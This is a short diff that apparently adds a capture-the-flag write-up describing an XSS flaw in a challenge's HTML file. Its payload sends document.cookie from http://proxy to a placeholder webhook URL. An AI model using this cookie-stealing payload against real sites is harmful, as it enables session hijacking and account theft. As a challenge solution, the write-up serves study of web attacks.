@@ -1,0 +1,4 @@
+The vulnerability lies in the html file where we can do XSS
+We also have bot.js and index.js, after reading it carefully, we know we just need to steal the cookie from http://proxy
+The payload is :
+http://proxy/?x=document.location="<YOUR WEBHOOK URL>/?c="%2bdocument.cookie;
